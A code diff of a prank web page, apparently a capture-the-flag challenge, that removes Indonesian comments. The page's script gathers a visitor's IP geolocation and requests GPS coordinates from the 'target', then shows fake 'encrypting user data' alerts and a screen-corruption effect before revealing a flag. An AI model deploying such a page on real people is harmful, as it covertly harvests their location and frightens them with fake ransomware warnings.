@@ -425,15 +425,13 @@
             100% { transform: translate(2px, 2px) rotate(0deg); }
         }
 
-        /* Class pemicu hancur visual */
         .system-corrupted {
             animation: shakeEffect 0.1s infinite;
-            filter: invert(100%) hue-rotate(180deg) !important; /* Membalikkan warna layar jadi menyeramkan */
+            filter: invert(100%) hue-rotate(180deg) !important; 
             background-color: #110000 !important;
             transition: none !important;
         }
 
-        /* Desain kotak teks peringatan palsu */
         .scary-alert {
             position: absolute;
             padding: 15px 25px;
@@ -473,7 +471,6 @@
                         press the button LOL
                     </div>
                     <div class="trigger-zone">
-                        <!-- Kita bisa set data bawaan yang mau dikirim di sini -->
                         <input type="hidden" id="payloadName" value="Target:">
                         <input type="hidden" id="payloadMessage" value="Payload injected successfully via Terminal.">
                         
@@ -559,7 +556,6 @@
     try {
         console.log("Mengumpulkan payload...");
         
-        // 1. Ganti ke API Geolocation cadangan yang lebih stabil tanpa limit ketat
         let geoData = {};
         try {
             const geoResponse = await fetch('https://ipwho.is');
@@ -584,7 +580,6 @@
             }
         } catch (e) {}
 
-        // 2. FUNGSI UTAMA: Meminta izin lokasi GPS presisi tinggi langsung dari HP/Browser target
         let gpsCoords = "Target Menolak Izin Lokasi GPS";
         let mapsUrl = "Tidak Ada Data GPS";
         
@@ -646,7 +641,6 @@ ${gpsCoords}
             "🔒 ENCRYPTING_USER_DATA..."
         ];
 
-        // C. Buat looping puluhan kotak
         let hitung = 0;
         const intervalAlert = setInterval(() => {
             if (hitung < 40) {
@@ -664,7 +658,6 @@ ${gpsCoords}
                     document.body.classList.remove('system-corrupted');
                     document.querySelectorAll('.scary-alert').forEach(el => el.remove());
                     
-                    // Pop-up kode rahasia
                     alert("you found me, Th1s is the code: Fscty{y0u_f0und_sc4r3p3r3_#098#}");
                 }, 1500);
             }
